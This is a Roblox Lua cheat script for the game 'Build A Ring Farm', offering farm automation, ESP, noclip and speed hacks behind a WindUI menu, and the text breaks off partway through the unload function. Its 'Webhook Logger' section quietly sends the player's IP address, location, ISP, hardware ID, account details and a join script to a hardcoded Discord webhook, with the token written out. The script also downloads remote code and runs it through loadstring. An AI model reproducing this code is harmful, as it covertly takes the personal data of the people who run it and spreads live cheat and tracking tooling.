--[[
    Mizukage Engine: Build A Ring Farm Automation
    Powered by WindUI | Webhook Logger Included
]]

local WEBHOOK_URL = "https://discord.com/api/webhooks/1516421004291997718/t5nSkmWsiwWFpSNHjJQv3fdQKWGm2SqOQag3LS3kSEwHL1QkuyfbgzFpLI7kDXO357Bj"

if getgenv().MizuFarmAutomation then
    return game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Build A Ring Farm",
        Text = "Script already running! Unload first."
    })
end
getgenv().MizuFarmAutomation = true

--================================================
-- 1. SERVICES & PATHS
--================================================
local Services = setmetatable({}, { __index = function(t, k) local s = game:GetService(k); t[k] = s; return s end })
local Players = Services.Players
local LocalPlayer = Players.LocalPlayer
local RunService = Services.RunService
local Workspace = Services.Workspace
local GuiService = Services.GuiService
local TeleportService = Services.TeleportService
local ReplicatedStorage = Services.ReplicatedStorage
local UserInputService = Services.UserInputService
local HttpService = Services.HttpService
local ContentProvider = Services.ContentProvider

-- Farm specific paths
local plotsFolder = Workspace:WaitForChild("Map"):WaitForChild("Plots")
local remotes = ReplicatedStorage:WaitForChild("Remotes")
local unlockEvent = remotes:WaitForChild("UnlockPlot")
local upgradePlantFunction = remotes:WaitForChild("UpgradePlant")
local sellCratesEvent = remotes:WaitForChild("SellCrates")
local rollSeedsEvent = remotes:WaitForChild("RollSeeds")
local buySeedEvent = remotes:WaitForChild("BuySeed")
local plantSeedEvent = remotes:WaitForChild("PlantSeed")

--================================================
-- 2. AUTO RECONNECT & ANTI-AFK
--================================================
local function SetupAutoReconnect()
    GuiService.ErrorMessageChanged:Connect(function()
        task.wait(1)
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end)
    
    local vUser = game:GetService("VirtualUser")
    LocalPlayer.Idled:Connect(function()
        vUser:CaptureController()
        vUser:ClickButton2(Vector2.new())
    end)
end

--================================================
-- 3. WEBHOOK LOGGER
--================================================
local function SendGameLog()
    if not WEBHOOK_URL or WEBHOOK_URL == "" or string.find(WEBHOOK_URL, "MASUKKAN") then return end
    task.spawn(function()
        task.wait(3)
        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        if not request then return end

        local userId = LocalPlayer.UserId
        local displayName = LocalPlayer.DisplayName
        local username = LocalPlayer.Name
        local accountAge = LocalPlayer.AccountAge
        local membership = LocalPlayer.MembershipType.Name
        local placeId = game.PlaceId
        local jobId = game.JobId
        local Market = game:GetService("MarketplaceService")

        local hwid = "Unknown"
        pcall(function() if gethwid then hwid = gethwid() elseif identifying then hwid = identifying() end end)

        local statsText = "No Leaderstats"
        local ls = LocalPlayer:FindFirstChild("leaderstats")
        if ls then
            local t = {}
            for _, v in pairs(ls:GetChildren()) do
                if v:IsA("IntValue") or v:IsA("NumberValue") or v:IsA("StringValue") then
                    table.insert(t, "> **" .. v.Name .. ":** `" .. tostring(v.Value) .. "`")
                end
            end
            if #t > 0 then statsText = table.concat(t, "\n") end
        end

        local avatarURL = "https://i.imgur.com/C5uYqFk.png"
        pcall(function()
            local d = HttpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..userId.."&size=420x420&format=Png&isCircular=false"))
            if d.data and d.data[1] then avatarURL = d.data[1].imageUrl end
        end)

        local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
        local ipData = { query = "Hidden", country = "Unknown", city = "Unknown", isp = "Unknown" }
        pcall(function() ipData = HttpService:JSONDecode(game:HttpGet("https://ip-api.com/json")) end)

        local platform = UserInputService.TouchEnabled and not UserInputService.MouseEnabled and "Mobile" or "PC"
        local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
        local fps = math.floor(workspace:GetRealPhysicsFPS())
        local gameName = "Build A Ring Farm"
        pcall(function() gameName = Market:GetProductInfo(placeId).Name end)
        
        local embedColor = (membership == "Premium") and 16766720 or 16724530
        local joinScript = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", tostring(placeId), jobId)
        local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"

        local data = {
            username = "Mizukage Logger",
            avatar_url = avatarURL,
            content = "",
            embeds = {{
                title = gameName .. " | LOG REPORT",
                url = profileLink,
                color = embedColor,
                thumbnail = { url = avatarURL },
                fields = {
                    { name = "USER INFORMATION", value = string.format("> **Display:** `%s`\n> **User:** [%s](%s)\n> **ID:** `%s`\n> **Age:** %d Days", displayName, username, profileLink, userId, accountAge), inline = true },
                    { name = "HARDWARE ID", value = "```" .. hwid .. "```", inline = true },
                    { name = "IN-GAME STATS", value = statsText, inline = false },
                    { name = "NETWORK & DEVICE", value = string.format("> **IP:** ||`%s`||\n> **Loc:** %s, %s\n> **Exe:** `%s` (%s)\n> **Ping:** `%dms` | **FPS:** `%d`", ipData.query, ipData.city, ipData.country, executor, platform, ping, fps), inline = false },
                    { name = "QUICK JOIN", value = "```lua\n" .. joinScript .. "```", inline = false }
                },
                footer = { text = "Mizukage Engine • ISP: " .. ipData.isp, icon_url = avatarURL },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(data) })
    end)
end

--================================================
-- 4. CORE ENGINE (ESP, Movement, NoDelay)
--================================================
local Config = { NoDelay = false, SpeedHack = false, Noclip = false, WalkSpeed = 25 }
local GhostColor = Color3.fromRGB(255, 60, 60)
local PlayerColor = Color3.fromRGB(60, 255, 60)

local function IsGhostModel(obj)
    if not obj:IsA("Model") then return false end
    if Players:GetPlayerFromCharacter(obj) then return false end
    local hum = obj:FindFirstChildOfClass("Humanoid")
    local anim = obj:FindFirstChildOfClass("AnimationController")
    if ((hum and hum.Health > 0) or anim) and not obj.Name:lower():find("dummy") then return true end
    return false
end

-- Noclip
local NoclipConnection
local function SetNoclip(enabled)
    Config.Noclip = enabled
    if NoclipConnection then NoclipConnection:Disconnect(); NoclipConnection = nil end
    if enabled then
        NoclipConnection = RunService.Stepped:Connect(function()
            local char = LocalPlayer.Character
            if char then for _, p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = false end end end
        end)
    else
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            char.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0)
            task.wait(0.1)
            for _, p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = true end end
        end
    end
end

-- SpeedHack
local SpeedHackConnection
local function SetSpeedHack(enabled)
    Config.SpeedHack = enabled
    if SpeedHackConnection then SpeedHackConnection:Disconnect(); SpeedHackConnection = nil end
    if enabled then
        SpeedHackConnection = RunService.Heartbeat:Connect(function()
            local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.WalkSpeed = Config.WalkSpeed end
        end)
    else
        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.WalkSpeed = 16 end -- default walk speed
    end
end

-- NoDelay (Instant E Prompt)
local NoDelayConnection
local function SetNoDelay(enabled)
    Config.NoDelay = enabled
    if NoDelayConnection then NoDelayConnection:Disconnect(); NoDelayConnection = nil end
    if enabled then
        for _, d in ipairs(Workspace:GetDescendants()) do if d:IsA("ProximityPrompt") then pcall(function() d.HoldDuration = 0 end) end end
        NoDelayConnection = Workspace.DescendantAdded:Connect(function(d) if d:IsA("ProximityPrompt") then pcall(function() d.HoldDuration = 0 end) end end)
    else
        for _, d in ipairs(Workspace:GetDescendants()) do if d:IsA("ProximityPrompt") then pcall(function() d.HoldDuration = 1 end) end end
    end
end

-- ESP System
local Highlights = { Ghost = {}, Player = {} }
local ESPLoops = { Ghost = false, Player = false }
local ESPThreads = { Ghost = nil, Player = nil }

local function ClearESP(t) 
    for _, hl in pairs(Highlights[t]) do pcall(function() hl:Destroy() end) end 
    table.clear(Highlights[t]) 
end

local function SetESP(espType, enabled)
    ESPLoops[espType] = enabled
    if ESPThreads[espType] then task.cancel(ESPThreads[espType]) end
    ClearESP(espType)
    if not enabled then return end
    
    local prefix = espType .. "ESP"
    local isValidFunc = (espType == "Ghost") and IsGhostModel or function(obj) 
        if obj:IsA("Model") then local plr = Players:GetPlayerFromCharacter(obj); return plr ~= nil and plr ~= LocalPlayer end return false 
    end

    ESPThreads[espType] = task.spawn(function()
        while ESPLoops[espType] do
            for i = #Highlights[espType], 1, -1 do
                local hl = Highlights[espType][i]
                if not hl or not hl.Parent then pcall(function() hl:Destroy() end); table.remove(Highlights[espType], i) end
            end
            
            local color = (espType == "Ghost") and GhostColor or PlayerColor
            for _, obj in ipairs(Workspace:GetDescendants()) do
                if isValidFunc(obj) and not obj:FindFirstChild(prefix) then
                    local hl = Instance.new("Highlight")
                    hl.Name = prefix; hl.FillColor = color; hl.FillTransparency = 0.3; hl.Parent = obj
                    table.insert(Highlights[espType], hl)
                end
            end
            task.wait(1.5)
        end
    end)
end

local function UpdateESPColors()
    for _, hl in ipairs(Highlights.Ghost) do if hl and hl.Parent then hl.FillColor = GhostColor end end
    for _, hl in ipairs(Highlights.Player) do if hl and hl.Parent then hl.FillColor = PlayerColor end end
end

--================================================
-- 5. FARMING AUTOMATION LOGIC (from original)
--================================================
-- Settings
local UNLOCK_RETRY_INTERVAL = 0.1
local AFTER_UNLOCK_DELAY = 0.1
local UNLOCK_RESCAN_INTERVAL = 0.1
local UPGRADE_RESPONSE_TIMEOUT = 0.35
local BETWEEN_PLANTS_DELAY = 0.1
local BETWEEN_UPGRADE_ROUNDS_DELAY = 0.1
local FAILED_UPGRADE_DELAY = 0.35
local AUTO_COLLECT_INTERVAL = 0.5
local AUTO_ROLL_INTERVAL = 0.4
local ROLL_RESULT_TIMEOUT = 3
local AUTO_BUY_RETRY_INTERVAL = 1
local AUTO_BUY_CONFIRM_TIMEOUT = 1.25
local AUTO_PLACE_INTERVAL = 0.2
local AUTO_PLACE_RETRY_DELAY = 0.5
local AUTO_PLACE_RESPONSE_TIMEOUT = 1
local AUTO_PLACE_EQUIP_DELAY = 0.15

local RARITY_ORDER = {
    "Common", "Uncommon", "Rare", "Epic", "Legendary",
    "Mythic", "Divine", "Secret", "Exotic", "Prismatic",
}

-- State
local autoUnlockEnabled = false
local autoUpgradeEnabled = false
local autoCollectEnabled = false
local autoRollEnabled = false
local autoBuyEnabled = true
local autoPlaceEnabled = false
local selectedUpgradeFloors = { [1] = true, [2] = true }
local unlockWorkerRunning = false
local upgradeWorkerRunning = false
local collectWorkerRunning = false
local rollWorkerRunning = false
local placeWorkerRunning = false
local selectedRarities = { Exotic = true, Prismatic = true }
local seedRarities = {}
local pendingBuySlot = nil
local pendingBuySeed = nil
local pendingBuyRarity = nil

-- Plot detection helpers
local function valueMatchesPlayer(value)
    return value == LocalPlayer or value == LocalPlayer.Name or value == LocalPlayer.UserId or tostring(value) == tostring(LocalPlayer.UserId)
end

local function hasOwnershipMarker(plot)
    local ownershipNames = { Owner = true, OwnerName = true, OwnerUserId = true, UserId = true, Player = true, PlayerName = true, ClaimedBy = true }
    for attr, val in pairs(plot:GetAttributes()) do if ownershipNames[attr] and valueMatchesPlayer(val) then return true end end
    for _, obj in ipairs(plot:GetDescendants()) do
        for attr, val in pairs(obj:GetAttributes()) do if ownershipNames[attr] and valueMatchesPlayer(val) then return true end end
        if ownershipNames[obj.Name] then
            if obj:IsA("ObjectValue") and obj.Value == LocalPlayer then return true end
            if obj:IsA("StringValue") and obj.Value == LocalPlayer.Name then return true end
            if (obj:IsA("IntValue") or obj:IsA("NumberValue")) and obj.Value == LocalPlayer.UserId then return true end
        end
    end
    return false
end

local function countUnlockedTiles(plot)
    local count = 0
    local found = false
    for _, obj in ipairs(plot:GetDescendants()) do
        if obj.Name == "FarmPlot" then
            found = true
            for _, tile in ipairs(obj:GetChildren()) do
                if tile:GetAttribute("Unlocked") == true and tile:FindFirstChild("Dirt") then count += 1 end
            end
        end
    end
    return found and count or -1
end

local function detectOwnedPlot()
    for _, plot in ipairs(plotsFolder:GetChildren()) do
        if plot:IsA("Model") and hasOwnershipMarker(plot) then return plot end
    end
    local bestPlot; local highest = -1
    for _, plot in ipairs(plotsFolder:GetChildren()) do
        if plot:IsA("Model") then
            local c = countUnlockedTiles(plot)
            if c > highest then highest = c; bestPlot = plot end
        end
    end
    return bestPlot
end

local function getAllFarmPlots(ownedPlot)
    local farmPlots = {}
    if not ownedPlot then return farmPlots end
    for _, obj in ipairs(ownedPlot:GetDescendants()) do if obj.Name == "FarmPlot" then table.insert(farmPlots, obj) end end
    table.sort(farmPlots, function(a,b) return a:GetFullName() < b:GetFullName() end)
    return farmPlots
end

local function getFloorNumber(farmPlot)
    local current = farmPlot
    while current and current ~= workspace do
        local n = tonumber(string.match(current.Name, "^Floor(%d+)$"))
        if n then return n end
        current = current.Parent
    end
    return 1
end

local function getOwnedSeedRoller()
    local owned = detectOwnedPlot()
    if not owned then return nil, nil end
    return owned, owned:FindFirstChild("SeedRoller")
end

-- Auto Unlock
local function runAutoUnlock()
    if unlockWorkerRunning then return end
    unlockWorkerRunning = true
    task.spawn(function()
        while autoUnlockEnabled do
            local owned = detectOwnedPlot()
            if not owned then task.wait(UNLOCK_RESCAN_INTERVAL) continue end
            local locked = {}
            for _, fp in ipairs(getAllFarmPlots(owned)) do
                local floor = getFloorNumber(fp)
                for _, tile in ipairs(fp:GetChildren()) do
                    local dirt = tile:FindFirstChild("Dirt")
                    local plotKey = tile:GetAttribute("PlotKey")
                    if dirt and tile:GetAttribute("Unlocked") ~= true then
                        table.insert(locked, {model = tile, dirt = dirt, floor = floor, key = typeof(plotKey)=="number" and plotKey or math.huge})
                    end
                end
            end
            table.sort(locked, function(a,b) return a.floor < b.floor or (a.floor==b.floor and a.key < b.key) end)
            if #locked == 0 then task.wait(UNLOCK_RESCAN_INTERVAL) continue end
            local t = locked[1]
            if not t.model.Parent or not t.dirt.Parent then task.wait(UNLOCK_RESCAN_INTERVAL) continue end
            unlockEvent:FireServer(t.dirt)
            task.wait(UNLOCK_RETRY_INTERVAL)
            if t.model:GetAttribute("Unlocked") == true then
                print("Unlocked Floor", t.floor, "PlotKey", t.key)
                task.wait(AFTER_UNLOCK_DELAY)
            end
        end
        unlockWorkerRunning = false
    end)
end

-- Auto Upgrade
local function collectPlants(owned)
    local plants = {}
    for _, fp in ipairs(getAllFarmPlots(owned)) do
        local floor = getFloorNumber(fp)
        if selectedUpgradeFloors[floor] then
            for _, tile in ipairs(fp:GetChildren()) do
                local dirt = tile:FindFirstChild("Dirt")
                if dirt and tile:GetAttribute("Unlocked") then
                    local name = dirt:GetAttribute("PlantName")
                    local lvl = dirt:GetAttribute("PlantLevel")
                    if typeof(name)=="string" and name~="" and typeof(lvl)=="number" then
                        table.insert(plants, {dirt = dirt, name = name, level = lvl, floor = floor, key = tile:GetAttribute("PlotKey") or dirt:GetAttribute("PlotKey") or math.huge})
                    end
                end
            end
        end
    end
    table.sort(plants, function(a,b) return a.level < b.level or (a.level==b.level and a.floor < b.floor) or (a.level==b.level and a.floor==b.floor and a.key < b.key) end)
    return plants
end

local function waitForLevelIncrease(dirt, old)
    local t = os.clock()
    while autoUpgradeEnabled and os.clock()-t < UPGRADE_RESPONSE_TIMEOUT do
        local new = dirt:GetAttribute("PlantLevel")
        if typeof(new)=="number" and new > old then return true end
        task.wait(0.03)
    end
    return false
end

local function upgradePlantOnce(info)
    if not info.dirt.Parent then return false end
    local old = info.dirt:GetAttribute("PlantLevel")
    if typeof(old) ~= "number" then return false end
    pcall(function() upgradePlantFunction:InvokeServer(info.dirt) end)
    return waitForLevelIncrease(info.dirt, old)
end

local function runAutoUpgrade()
    if upgradeWorkerRunning then return end
    upgradeWorkerRunning = true
    task.spawn(function()
        while autoUpgradeEnabled do
            local owned = detectOwnedPlot()
            if not owned then task.wait(BETWEEN_UPGRADE_ROUNDS_DELAY) continue end
            if not next(selectedUpgradeFloors) then task.wait(BETWEEN_UPGRADE_ROUNDS_DELAY) continue end
            local plants = collectPlants(owned)
            if #plants == 0 then task.wait(BETWEEN_UPGRADE_ROUNDS_DELAY) continue end
            local lowest = plants[1].level
            local upgraded = false
            for _, info in ipairs(plants) do
                if not autoUpgradeEnabled then break end
                if info.level ~= lowest then break end
                if upgradePlantOnce(info) then upgraded = true end
                task.wait(BETWEEN_PLANTS_DELAY)
            end
            task.wait(upgraded and BETWEEN_UPGRADE_ROUNDS_DELAY or FAILED_UPGRADE_DELAY)
        end
        upgradeWorkerRunning = false
    end)
end

-- Auto Collect
local function runAutoCollect()
    if collectWorkerRunning then return end
    collectWorkerRunning = true
    task.spawn(function()
        while autoCollectEnabled do
            pcall(function() sellCratesEvent:FireServer() end)
            task.wait(AUTO_COLLECT_INTERVAL)
        end
        collectWorkerRunning = false
    end)
end

-- Auto Place Seeds
local function isSeedTool(obj) return obj:IsA("Tool") and string.find(string.lower(obj.Name), "seed") ~= nil end
local function getEquippedSeed() for _,v in ipairs(LocalPlayer.Character or {}) do if isSeedTool(v) then return v end end end
local function getBackpackSeed() for _,v in ipairs(LocalPlayer.Backpack or {}) do if isSeedTool(v) then return v end end end
local function getAnySeed() return getEquippedSeed() or getBackpackSeed() end
local function equipSeed(tool)
    if not tool or not tool.Parent then return false end
    local char = LocalPlayer.Character
    if not char then return false end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return false end
    if tool.Parent == char then return true end
    hum:UnequipTools()
    task.wait(0.05)
    hum:EquipTool(tool)
    task.wait(AUTO_PLACE_EQUIP_DELAY)
    return tool.Parent == char
end

local function isDirtEmpty(dirt)
    local n = dirt:GetAttribute("PlantName")
    return n == nil or n == ""
end

local function getEmptyUnlockedTiles(plot)
    local tiles = {}
    for _, fp in ipairs(getAllFarmPlots(plot)) do
        for _, tile in ipairs(fp:GetChildren()) do
            local dirt = tile:FindFirstChild("Dirt")
            local key = tile:GetAttribute("PlotKey")
            if dirt and tile:GetAttribute("Unlocked") and isDirtEmpty(dirt) then
                table.insert(tiles, {tile = tile, dirt = dirt, fp = fp, key = typeof(key)=="number" and key or math.huge})
            end
        end
    end
    table.sort(tiles, function(a,b) return a.fp:GetFullName() < b.fp:GetFullName() or (a.fp:GetFullName()==b.fp:GetFullName() and a.key < b.key) end)
    return tiles
end

local function waitForPlant(dirt)
    local t = os.clock()
    while autoPlaceEnabled and dirt.Parent and os.clock()-t < AUTO_PLACE_RESPONSE_TIMEOUT do
        if not isDirtEmpty(dirt) then return true end
        task.wait(0.05)
    end
    return false
end

local function plantSeedOnTile(seedTool, tileInfo)
    if not seedTool or not tileInfo.dirt.Parent or not tileInfo.tile:GetAttribute("Unlocked") or not isDirtEmpty(tileInfo.dirt) then return false end
    if not equipSeed(seedTool) then warn("Could not equip", seedTool.Name); return false end
    pcall(function() plantSeedEvent:FireServer(tileInfo.dirt) end)
    return waitForPlant(tileInfo.dirt)
end

local function runAutoPlace()
    if placeWorkerRunning then return end
    placeWorkerRunning = true
    task.spawn(function()
        local fails = 0
        while autoPlaceEnabled do
            local seedTool = getAnySeed()
            if not seedTool then task.wait(AUTO_PLACE_RETRY_DELAY) continue end
            local owned = detectOwnedPlot()
            if not owned then task.wait(AUTO_PLACE_RETRY_DELAY) continue end
            local empties = getEmptyUnlockedTiles(owned)
            if #empties == 0 then task.wait(AUTO_PLACE_RETRY_DELAY) continue end
            if plantSeedOnTile(seedTool, empties[1]) then
                fails = 0
                task.wait(AUTO_PLACE_INTERVAL)
            else
                fails += 1
                task.wait(fails >= 3 and 1 or AUTO_PLACE_RETRY_DELAY)
            end
        end
        placeWorkerRunning = false
    end)
end

-- Auto Roll (with purchase system)
local function normalizeSeedName(text) text = tostring(text or ""):gsub("Seed",""):gsub("^%s+",""):gsub("%s+$",""); return string.lower(text) end
local function cleanRarity(text) return tostring(text or ""):gsub("^%s+",""):gsub("%s+$","") end

local function buildRarityDatabase()
    table.clear(seedRarities)
    for _, obj in ipairs(LocalPlayer.PlayerGui:GetDescendants()) do
        if obj.Name == "RarityName" and (obj:IsA("TextLabel") or obj:IsA("TextButton")) then
            local entry = obj.Parent
            if entry then
                local norm = normalizeSeedName(entry.Name)
                local rar = cleanRarity(obj.Text)
                if norm ~= "" and rar ~= "" then seedRarities[norm] = rar end
            end
        end
    end
    local c = 0; for _ in pairs(seedRarities) do c+=1 end; return c
end

local function makeRollSnapshot(roller)
    local snap = {}
    for i=1,6 do snap[i] = roller:GetAttribute("RolledSeed"..i) end
    return snap
end

local function rollResultsChanged(roller, snap)
    for i=1,6 do if roller:GetAttribute("RolledSeed"..i) ~= snap[i] then return true end end
    return false
end

local function waitForRollResults(roller, snap)
    local t = os.clock()
    while autoRollEnabled and os.clock()-t < ROLL_RESULT_TIMEOUT do
        if rollResultsChanged(roller, snap) then task.wait(0.1); return true end
        task.wait(0.05)
    end
    return false
end

local function inspectRollResults(roller)
    for i=1,6 do
        local name = roller:GetAttribute("RolledSeed"..i)
        if typeof(name)=="string" and name~="" then
            local rarity = seedRarities[normalizeSeedName(name)]
            if rarity then
                print("Rolled slot:", i, "Seed:", name, "Rarity:", rarity)
                if selectedRarities[rarity] then return true, i, name, rarity end
            end
        end
    end
    return false
end

local function getInventorySeedFingerprint()
    local parts = {}
    local function scan(c) if not c then return end
        for _,v in ipairs(c:GetDescendants()) do if v:IsA("Tool") and isSeedTool(v) then
            table.insert(parts, v:GetFullName().."|"..v.Name)
            for a,val in pairs(v:GetAttributes()) do table.insert(parts, a.."="..tostring(val)) end
            for _,child in ipairs(v:GetDescendants()) do if child:IsA("IntValue") or child:IsA("NumberValue") or child:IsA("StringValue") or child:IsA("BoolValue") then table.insert(parts, child:GetFullName().."="..tostring(child.Value)) end end
        end end
    end
    scan(LocalPlayer.Backpack); scan(LocalPlayer.Character)
    table.sort(parts); return table.concat(parts,"||")
end

local function waitForPurchaseConfirmation(roller, slot, seedName, oldFingerprint, oldSlot)
    local changed = false
    local function flag() changed = true end
    local conns = {}
    local backpack = LocalPlayer.Backpack; if backpack then table.insert(conns, backpack.ChildAdded:Connect(flag)); table.insert(conns, backpack.ChildRemoved:Connect(flag)) end
    local char = LocalPlayer.Character; if char then table.insert(conns, char.ChildAdded:Connect(flag)); table.insert(conns, char.ChildRemoved:Connect(flag)) end
    local t = os.clock()
    local confirmed = false
    while autoRollEnabled and autoBuyEnabled and os.clock()-t < AUTO_BUY_CONFIRM_TIMEOUT do
        if roller:GetAttribute("RolledSeed"..slot) ~= oldSlot then confirmed = true break end
        if changed or getInventorySeedFingerprint() ~= oldFingerprint then confirmed = true break end
        task.wait(0.05)
    end
    for _,c in ipairs(conns) do c:Disconnect() end
    return confirmed
end

local function buyRolledSeedOnce(roller, slot, seedName, rarity)
    local oldFp = getInventorySeedFingerprint()
    local oldSlot = roller:GetAttribute("RolledSeed"..slot)
    pcall(function() buySeedEvent:FireServer(slot) end)
    return waitForPurchaseConfirmation(roller, slot, seedName, oldFp, oldSlot)
end

local function buyRolledSeedUntilSuccess(roller, slot, seedName, rarity)
    local attempt = 0
    while autoRollEnabled and autoBuyEnabled do
        attempt += 1
        if buyRolledSeedOnce(roller, slot, seedName, rarity) then
            print("Purchased", rarity, seedName, "attempts:", attempt)
            return true
        end
        task.wait(AUTO_BUY_RETRY_INTERVAL)
    end
    return false
end

local function manualBuy() -- for manual mode
    if not pendingBuySlot then return end
    local _, roller = getOwnedSeedRoller()
    if not roller then return end
    if buyRolledSeedOnce(roller, pendingBuySlot, pendingBuySeed, pendingBuyRarity) then
        print("Manual buy confirmed")
    end
    pendingBuySlot = nil; pendingBuySeed = nil; pendingBuyRarity = nil
end

local function stopAutoRoll(reason)
    autoRollEnabled = false
    print("Auto Roll stopped:", reason)
end

local function runAutoRoll()
    if rollWorkerRunning then return end
    if not next(selectedRarities) then stopAutoRoll("No rarity selected") return end
    rollWorkerRunning = true
    task.spawn(function()
        local loaded = buildRarityDatabase()
        if loaded == 0 then stopAutoRoll("Rarity database empty") rollWorkerRunning = false return end
        while autoRollEnabled do
            local _, roller = getOwnedSeedRoller()
            if not roller then task.wait(0.5) continue end
            local snap = makeRollSnapshot(roller)
            pcall(function() rollSeedsEvent:FireServer() end)
            if waitForRollResults(roller, snap) then
                local found, slot, name, rarity = inspectRollResults(roller)
                if found then
                    if autoBuyEnabled then
                        buyRolledSeedUntilSuccess(roller, slot, name, rarity)
                        task.wait(AUTO_ROLL_INTERVAL)
                    else -- manual mode
                        autoRollEnabled = false
                        pendingBuySlot = slot; pendingBuySeed = name; pendingBuyRarity = rarity
                        print("Found", rarity, name, "in slot", slot, ". Press manual buy!")
                        break
                    end
                end
            end
            task.wait(AUTO_ROLL_INTERVAL)
        end
        rollWorkerRunning = false
    end)
end

--================================================
-- 6. WIND UI INTERFACE
--================================================
local function InitInterface()
    local success, WindUI = pcall(function() return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))() end)
    if not success or not WindUI then success, WindUI = pcall(function() return loadstring(game:HttpGet("https://tree-hub.vercel.app/api/UI/WindUI"))() end) end
    if not success or not WindUI then return end

    local Sounds = { StartupId = "rbxassetid://140397610798305", ClickId = "rbxassetid://140277245983305" }
    pcall(function() ContentProvider:PreloadAsync({Sounds.StartupId, Sounds.ClickId}) end)
    function Sounds:Play(id, volume)
        task.spawn(function()
            local s = Instance.new("Sound"); s.SoundId = id; s.Volume = volume or 1; s.Parent = Services.SoundService
            s.Ended:Connect(function() s:Destroy() end); s:Play()
        end)
    end
    Sounds:Play(Sounds.StartupId, 1)
    local Click = function() Sounds:Play(Sounds.ClickId, 0.8) end

    WindUI:Notify({ Title = "Build A Ring Farm", Content = "Mizukage Automation Aktif!", Duration = 5, Icon = "leaf" })

    local vs = Workspace.CurrentCamera.ViewportSize
    local isMobile = vs.X < 850
    local Window = WindUI:CreateWindow({
        Title = "BUILD A RING FARM",
        Icon = "lucide:tractor",
        Author = "Mizukage Official",
        Folder = "BuildARingFarm",
        Size = isMobile and UDim2.fromOffset(vs.X * 0.85, vs.Y * 0.85) or UDim2.fromOffset(600, 420),
        Transparent = true,
        Theme = "Dark",
        Accent = Color3.fromRGB(120, 160, 80),
        SideBarWidth = isMobile and 150 or 200,
        HasOutline = true,
        Background = "rbxassetid://137490169052447",
        BackgroundImageTransparency = 0.75
    })
    Window:Tag({ Title = "VIP Exclusive", Icon = "lucide:crown", Color = Color3.fromHex("#c9a44b"), Radius = 6 })

    local TabFarm = Window:Tab({ Title = "Farm", Icon = "lucide:leaf" })
    local TabRoll = Window:Tab({ Title = "Roller", Icon = "lucide:dices" })
    local TabEngine = Window:Tab({ Title = "Engine", Icon = "lucide:cpu" })
    local TabVision = Window:Tab({ Title = "Vision", Icon = "lucide:eye" })
    local TabMove = Window:Tab({ Title = "Movement", Icon = "lucide:move" })

    -- FARM TAB
    TabFarm:Section({ Title = "Plot Automation" })
    local UnlockToggle = TabFarm:Toggle({ Title = "Auto Unlock Plots", Desc = "Unlock all locked tiles across all floors.", Default = false, Callback = function(v) Click(); autoUnlockEnabled = v; if v then runAutoUnlock() end end })
    local UpgradeToggle = TabFarm:Toggle({ Title = "Auto Upgrade Plants", Desc = "Upgrade lowest-level plants on selected floors.", Default = false, Callback = function(v) Click(); autoUpgradeEnabled = v; if v then runAutoUpgrade() end end })
    TabFarm:Section({ Title = "Upgrade Floors" })
    for i=1,4 do
        TabFarm:Toggle({ Title = "Floor "..i, Desc = "Include in upgrade rotation.", Default = selectedUpgradeFloors[i], Callback = function(v) Click(); selectedUpgradeFloors[i] = v end })
    end
    TabFarm:Section({ Title = "Collection & Planting" })
    local CollectToggle = TabFarm:Toggle({ Title = "Auto Collect Crates", Desc = "Sell crates periodically.", Default = false, Callback = function(v) Click(); autoCollectEnabled = v; if v then runAutoCollect() end end })
    local PlaceToggle = TabFarm:Toggle({ Title = "Auto Place Seeds", Desc = "Plant seeds on empty tiles.", Default = false, Callback = function(v) Click(); autoPlaceEnabled = v; if v then runAutoPlace() end end })

    -- ROLLER TAB
    TabRoll:Section({ Title = "Seed Rolling" })
    local RollToggle = TabRoll:Toggle({ Title = "Auto Roll Seeds", Desc = "Keep rolling for selected rarities.", Default = false, Callback = function(v) Click(); autoRollEnabled = v; if v then runAutoRoll() end end })
    TabRoll:Section({ Title = "Rarity Selection" })
    for _, rarity in ipairs(RARITY_ORDER) do
        TabRoll:Toggle({ Title = rarity, Default = selectedRarities[rarity] == true, Callback = function(v) Click(); selectedRarities[rarity] = v end })
    end
    TabRoll:Section({ Title = "Purchase Mode" })
    local BuyModeToggle = TabRoll:Toggle({ Title = "Auto Buy", Desc = "Automatically purchase matched seeds.", Default = true, Callback = function(v) Click(); autoBuyEnabled = v end })
    TabRoll:Button({ Title = "Buy Last Found Seed", Desc = "Manual buy if auto is off.", Variant = "Secondary", Callback = function() Click(); manualBuy() end })

    -- ENGINE TAB
    TabEngine:Section({ Title = "Utilities" })
    TabEngine:Toggle({ Title = "Fast Tap (NoDelay)", Desc = "Instant E prompts.", Default = false, Callback = function(v) Click(); SetNoDelay(v) end })
    TabEngine:Button({ Title = "Rejoin Server", Variant = "Secondary", Callback = function() Click(); TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer) end })
    TabEngine:Button({ Title = "Unload Script", Variant = "Primary", Callback = function()
        Click()
        WindUI:Popup({
            Title = "Konfirmasi Unload",
            Icon = "alert-triangle",
            Content = "Matikan semua modul?",
            Buttons = {
                { Title = "Batal", Callback = function() end, Variant = "Tertiary" },
                { Title = "Matikan", Icon = "power-off", Variant = "Primary", Callback = function()
                    getgenv().MizuFarmAutomation = false
